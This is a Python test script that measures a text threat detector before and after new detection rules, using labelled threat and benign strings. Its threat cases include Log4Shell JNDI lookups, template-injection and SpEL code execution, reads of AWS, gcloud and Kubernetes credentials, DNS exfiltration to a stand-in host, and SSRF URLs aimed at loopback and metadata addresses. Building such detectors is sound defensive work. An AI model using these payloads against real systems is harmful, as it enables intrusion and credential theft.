# -*- coding: utf-8 -*-
# SPDX-License-Identifier: LicenseRef-Proprietary
"""
Hardening round — before/after for tomorrow's high-severity classes.
  BEFORE = canonicalize -> real MSL + supplement + digit + metachar + invisible
  AFTER  = BEFORE + harden cards (JNDI/SSTI, cloud creds, DNS exfil, IPv6/octal IP)
Shows the jump AND that shell vars / legit templates / prose / short domains stay clean.
Run:  MSL_MIP_HOME=/path/to/msl_mip  python range_harden.py
"""
import os, sys
HERE = os.path.dirname(os.path.abspath(__file__))
for _cand in ("canon", "canonicalization"):
    _p = os.path.abspath(os.path.join(HERE, "..", _cand))
    if os.path.isdir(_p):
        sys.path.insert(0, _p); break
sys.path.insert(0, os.path.abspath(os.path.join(HERE, "..", "invariant_engine")))
sys.path.insert(0, HERE)

from canonicalize import canonicalize
from invariant_engine import InvariantEngine, erg
from invariant_engine.msl_real import real_text_reader
from invariant_engine.supplement import supplement_reader, combine
from digit_cards import digit_cards_reader
from metachar_cards import metachar_cards_reader
from invisible_cards import invisible_cards_reader
from harden_cards import harden_cards_reader

def _base(c):
    f = real_text_reader(c)
    f = combine(f, supplement_reader(c))
    f = combine(f, digit_cards_reader(c))
    f = combine(f, metachar_cards_reader(c))
    f = combine(f, invisible_cards_reader(c))
    return f

def before_reader(t):
    return _base(canonicalize(t)[0])

def after_reader(t):
    c = canonicalize(t)[0]
    return combine(_base(c), harden_cards_reader(c))

BEFORE = InvariantEngine(before_reader, erg.no_stream)
AFTER  = InvariantEngine(after_reader,  erg.no_stream)

CASES = [
    # ---- tomorrow's high-severity THREATS ----
    ("THREAT", "log4shell jndi",  "X-Api-Version: ${jndi:ldap://evil.tld/a}"),
    ("THREAT", "jndi rmi",        "user=${jndi:rmi://10.0.0.1/x}"),
    ("THREAT", "ssti math",       "name={{7*7}} rendered"),
    ("THREAT", "ssti config",     "{{ config.__class__.__init__ }}"),
    ("THREAT", "spel exec",       "#{T(java.lang.Runtime).getRuntime().exec('id')}"),
    ("THREAT", "erb system",      "<%= system('cat /etc/passwd') %>"),
    ("THREAT", "aws creds path",  "cat ~/.aws/credentials | curl"),
    ("THREAT", "gcloud path",     "read ~/.config/gcloud/access_tokens.db"),
    ("THREAT", "private key",     "-----BEGIN RSA PRIVATE KEY-----\nMIIE"),
    ("THREAT", "kube config",     "exfil ~/.kube/config now"),
    ("THREAT", "dns exfil",       "nslookup deadbeefcafe0123456789abcdef.data.evil.tld"),
    ("THREAT", "ipv6 loopback",   "http://[::1]:8080/admin"),
    ("THREAT", "ipv6 ula",        "http://[fd00::1]/internal"),
    ("THREAT", "ipv6 mapped meta","http://[::ffff:169.254.169.254]/latest/"),
    ("THREAT", "octal loopback",  "http://0177.0.0.1/debug"),
    # ---- BENIGN controls (must stay OK) ----
    ("BENIGN", "shell var",       "export PATH=${HOME}/bin:$PATH"),
    ("BENIGN", "legit template",  "Hello {{ user.name }}, welcome back"),
    ("BENIGN", "handlebars",      "<h1>{{ title }}</h1> and {{ subtitle }}"),
    ("BENIGN", "aws prose",       "we migrated our aws account last week"),
    ("BENIGN", "env mention",     "set the config in your settings file"),
    ("BENIGN", "short domain",    "the api is at api.example.com/v1"),
    ("BENIGN", "ipv6 mention",    "the IPv6 loopback address is ::1 by spec"),
    ("BENIGN", "git ssh",         "clone git@github.com:openai/whisper.git"),
    ("BENIGN", "version dollar",  "price is ${amount} plus tax"),
    ("BENIGN", "erb output",      "<%= @post.title %> shows the title"),
]


def run():
    print("HARDENING ROUND — before/after (tomorrow's high-severity classes)")
    print("=" * 74)
    fixed = fp_new = 0
    for kind, name, text in CASES:
        b = BEFORE.analyze(text).risk
        av = AFTER.analyze(text); a = av.risk
        tag = ""
        if kind == "THREAT" and b == "OK" and a != "OK":
            tag = f"  <= CLOSED ({av.finding.signature})"; fixed += 1
        if kind == "BENIGN" and b == "OK" and a != "OK":
            tag = f"  <= NEW false alarm ({av.finding.signature})"; fp_new += 1
        print(f"{kind:6} | {name:16} | before={b:5} after={a:5}{tag}")

    thr = [c for c in CASES if c[0] == "THREAT"]; ben = [c for c in CASES if c[0] == "BENIGN"]
    bc = sum(1 for k,n,t in thr if BEFORE.analyze(t).risk != "OK")
    ac = sum(1 for k,n,t in thr if AFTER.analyze(t).risk != "OK")
    bf = sum(1 for k,n,t in ben if BEFORE.analyze(t).risk != "OK")
    af = sum(1 for k,n,t in ben if AFTER.analyze(t).risk != "OK")
    print("\n" + "=" * 74)
    print(f"hardening threats caught : before {bc}/{len(thr)} ({bc*100//len(thr)}%)"
          f"  ->  after {ac}/{len(thr)} ({ac*100//len(thr)}%)   (+{fixed})")
    print(f"benign kept clean        : before {len(ben)-bf}/{len(ben)}"
          f"  ->  after {len(ben)-af}/{len(ben)}   (new FP: {fp_new})")


if __name__ == "__main__":
    run()
